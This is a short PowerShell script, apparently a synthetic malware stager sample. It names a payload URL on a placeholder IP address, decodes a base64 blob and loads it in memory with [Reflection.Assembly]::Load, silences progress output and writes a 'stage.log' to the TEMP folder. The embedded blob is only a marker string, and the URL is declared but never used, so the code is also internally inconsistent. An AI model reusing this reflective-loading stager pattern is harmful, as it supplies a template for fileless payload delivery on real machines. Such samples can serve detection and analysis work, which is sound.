
$TransferUrl = "http://198.51.100.26/payload.bin"
$ErrorActionPreference = "Stop"

try {
    $ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo0YWc3Zmc3ZmQx')
    Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
    $FetchResult = [Reflection.Assembly]::Load($ManagedBytes)
    if ($null -ne $FetchResult) {
        Write-Verbose ("Loaded assembly: " + $FetchResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

$ProgressPreference = "SilentlyContinue"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
